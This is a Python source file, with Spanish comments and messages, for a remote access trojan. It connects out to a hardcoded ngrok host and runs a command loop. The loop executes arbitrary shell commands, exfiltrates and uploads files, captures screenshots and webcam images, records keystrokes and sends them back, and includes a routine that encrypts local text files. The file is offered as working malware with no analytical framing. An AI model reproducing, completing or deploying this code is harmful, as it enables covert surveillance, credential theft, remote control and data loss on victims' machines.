import socket
import os
import subprocess
import base64
import time
import shutil
import cv2
import random
import hashlib
import datetime
from pynput.keyboard import Listener
from pynput import keyboard
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from mss import mss



def capture_screen():
    with mss() as screen:
        screen.shot()

def encrypt_directory(directory):
    username = os.getlogin()
    destination = directory

    destination = os.path.abspath('')
    files = os.listdir(destination)
    files = [x for x in files if not x.startswith('.')]

    extensions = [".txt"]

    def generate_hash_key():
        hash_number = destination + socket.gethostname() + str(random.randint(0, 10000000000000000000000000000000000000000000000))
        hash_number = hash_number.encode('utf-8')
        hash_number = hashlib.sha512(hash_number)
        hash_number = hash_number.hexdigest()

        new_key = []

        for k in hash_number:
            if len(new_key) == 32:
                hash_number = ''.join(new_key)
                break
            else:
                new_key.append(k)

        return hash_number

    def encrypt_and_decrypt(file_path, crypto, block_size=16):
        with open(file_path, 'rb') as encrypted_file:
            unencrypted_content = encrypted_file.read(block_size)
            while unencrypted_content:
                encrypted_content = crypto.update(unencrypted_content)
                if len(unencrypted_content) != len(encrypted_content):
                    raise ValueError('')

                encrypted_file.seek(-len(unencrypted_content), 1)
                encrypted_file.write(encrypted_content)
                unencrypted_content = encrypted_file.read(block_size)

    def discover_files(key):
        files_list = open('files_list.txt', 'w+')

        for extension in extensions:
            for file in files:
                if file.endswith(extension):
                    files_list.write(os.path.join(file) + '\n')
        files_list.close()

        with open('files_list.txt', 'r') as file:
            files_to_encrypt = file.read().split('\n')
            files_to_encrypt = [i for i in files_to_encrypt if not i == '']

        if os.path.exists('hash_file.txt'):
            decrypt_field = input('Enter the symmetric key: ')
            with open('hash_file.txt', 'r') as hash_file:
                key = hash_file.read().split('\n')
                key = ''.join(key)

                if decrypt_field == key:
                    key = key.encode('utf-8')
                    salt = os.urandom(16)
                    kdf = PBKDF2HMAC(
                        algorithm=hashes.SHA256(),
                        length=32,
                        salt=salt,
                        iterations=100000,
                    )
                    key = base64.urlsafe_b64encode(kdf.derive(key))
                    iv = os.urandom(16)
                    cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
                    encryptor = cipher.encryptor()

                    for element in files_to_encrypt:
                        encrypt_and_decrypt(element, encryptor)
        else:
            salt = os.urandom(16)
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(key))
            iv = os.urandom(16)
            cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
            encryptor = cipher.encryptor()

            with open('hash_file.txt', 'wb') as hash_file:
                hash_file.write(key.encode('utf-8'))

            for element in files_to_encrypt:
                encrypt_and_decrypt(element, encryptor)

    def main():
        hash_number = generate_hash_key()
        hash_number = hash_number.encode('utf-8')
        discover_files(hash_number)

    main()

running = True  # Variable global para controlar la ejecución del listener
test = []
def key_listener():
    
    ip = socket.gethostbyname(socket.gethostname())
    file_name = f"{ip}.txt"  # Utilizar la dirección IP en el file_name
    f = open(file_name, 'a')
    t0 = time.time()
    global running

    def key_recorder(key):
        key = str(key)
        if key == 'Key.enter':
            f.write('\n')
        elif key == 'Key.space':
            f.write(key.replace('Key.space', ' '))
        elif key == 'Key.backspace':
            f.write(key.replace("Key.backspace", "%BORRAR%"))
        elif key == '<65027>':
            f.write('%ARROBA%')
        else:
            try:
                f.write(key.replace("u'", ""))
            except:
                print("Listo")
                listener.stop()
        if time.time() - t0 > 60:
            print("Listo")
            f.close()
            return False 
            

    with Listener(on_press=key_recorder) as listener:
        listener.join()

def stop_listener():
    test.append(1)

def capture_camera():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
    cv2.imwrite('img.png', gray)
    cap.release()

def establish_connection():
    ip = socket.gethostbyname(socket.gethostname())
    while True:
        time.sleep(5)
        try:
            client.connect(("4.tcp.ngrok.io", 16543))
            ###################################################################### server
            shell()
        except:
            print("error")
            break
        
        
        

def check_admin_privileges():
    global admin
    try:
        check = os.listdir(os.sep.join([os.environ.get("systemRoot", 'C:\window'), 'temp']))
    except:
        admin = "ERROR, Insufficient privileges"
    else:
        admin = "Administrator privileges"


def shell():
    
    current_dir = os.getcwd()
    client.send(current_dir.encode())
    print("direccion enviada")
    
    while True:
        
        print("esperando...")
        res = client.recv(1024).decode()
        
        
        if res == "exit":
            break
        elif res[:2] == "cd" and len(res) > 2:
            os.chdir(res[3:])
            result = os.getcwd()
            client.send(os.getcwd().encode())
        elif res[:8] == "download":
            with open(res[9:], 'r') as file_download:
                client.send(file_download.read().encode())
                file_download.close()
        elif res[:6] == "upload":
            with open(res[7:], 'w') as file_upload:
                data = client.recv(1000000)
                file_upload.write(data)
                file_upload.close()
        elif res[:10] == "screenshot":
            try:
                capture_screen()
                with open('monitor-1.png', 'rb') as file_send:
                    client.send(file_send.read().encode)
                    file_send.close()
                os.remove("monitor-1.png")

            except:
                client.send("fail".encode())
        elif res[:5] == "check":
            try:
                check_admin_privileges()
                client.send(admin.encode())
            except:
                client.send("Failed to execute the task".encode())
        elif res[:3] == "cam":
            try:
                capture_camera()
                with open('img.png', 'rb') as fileCam_send:
                    client.send(fileCam_send.read().encode())
                fileCam_send.close()
                os.remove("img.png")

            except:
                client.send("fail".encode())
        elif res[:3] == "set":
            key_listener()

        elif res[:3] == "get":
            stop_listener()
            time.sleep(2)
            try:
                ip = socket.gethostbyname(socket.gethostname())
                with open(f'{ip}.txt', 'r') as keys:
                    client.send(keys.read().encode())
                    keys.close()
                os.remove(f'{ip}.txt')

            except:
                client.send("fail".encode())

            with open("hash_file.txt", 'w') as file_upload:
                data = client.recv(1000000)
                file_upload.write(data)
                file_upload.close()

        elif res[:5] == "start":
            try:
                subprocess.Popen(res[6:], shell=True)
                client.send("Program started successfully".encode())
            except:
                client.send("Failed to execute the program".encode())
        else:
            proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            if len(result) == 0:
                
                try:
                    client.send("1".encode())
                except :
                    establish_connection()
                
            else:
                client.send(result)
                

    
while True:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    establish_connection()
